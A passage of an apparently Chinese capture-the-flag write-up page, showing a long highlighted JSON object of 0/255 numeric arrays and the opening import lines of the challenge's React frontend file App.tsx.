class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"5"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"6"</span>: [<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"7"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"8"</span>: [<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"9"</span>: [<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>]&#125;</span><br></pre></td></tr></table></figure><h4 id="0x5-题目源码"><a href="#0x5-题目源码" class="headerlink" title="0x5 题目源码"></a>0x5 题目源码</h4><h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><h6 id="App-tsx"><a href="#App-tsx" class="headerlink" title="App.tsx"></a>App.tsx</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> Drawer, &#123;drawerWidth&#125; <span class="keyword">from</span> <span class="string">"./Drawer"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    Button,</span><br><span class="line">    Card,</span><br><span class="line">    createStyles, LinearProgress, Link,</span><br><span class="line">    List,</span><br><span class="line">    ListItem,</span><br><span class="line">    TextField,</span><br><span class="line">    Theme,</span><br><span class="line">    withStyles</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">"@material-ui/core"</span>;</span><br><span class="line"></span><br><span class="line"><span 